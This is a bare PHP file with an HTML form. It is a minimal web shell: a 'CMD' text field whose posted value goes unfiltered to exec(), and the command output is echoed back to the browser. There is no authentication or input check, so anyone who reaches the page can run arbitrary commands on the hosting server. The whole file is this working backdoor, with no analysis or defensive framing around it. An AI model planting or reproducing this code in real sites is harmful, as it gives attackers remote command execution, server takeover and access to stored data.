<form method="post">
    <label>CMD:</label>
    <input type="text" name="cmd" value="ls -la" />
    <input type="submit" value="Execute" />
</form>
<?php
if (isset($_POST['cmd'])) {
    $s = $_POST['cmd'];
    $out;
    exec($s, $out);
    echo "<pre>";
    print_r($out);
    echo "</pre>";
}
?>